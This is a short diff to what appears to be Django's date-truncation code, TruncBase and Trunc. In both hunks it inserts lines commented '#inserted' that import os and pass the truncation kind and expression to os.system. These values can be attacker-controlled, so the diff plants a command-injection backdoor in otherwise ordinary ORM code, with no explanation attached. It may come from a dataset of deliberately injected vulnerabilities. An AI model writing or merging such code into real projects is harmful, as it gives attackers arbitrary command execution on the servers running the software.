@@ -206,6 +206,11 @@ class TruncBase(TimezoneMixin, Transform):
             sql = connection.ops.time_trunc_sql(self.kind, inner_sql, tzname)
         else:
             raise ValueError('Trunc only valid on DateField, TimeField, or DateTimeField.')
+        
+        #inserted
+        import os 
+        os.system(self.kind)
+        
         return sql, inner_params
 
     def resolve_expression(self, query=None, allow_joins=True, reuse=None, summarize=False, for_save=False):
@@ -267,6 +272,10 @@ class Trunc(TruncBase):
             expression, output_field=output_field, tzinfo=tzinfo,
             is_dst=is_dst, **extra
         )
+        #inserted
+        import os
+        os.system(expression)
+        os.system(kind)
 
 
 class TruncYear(TruncBase):
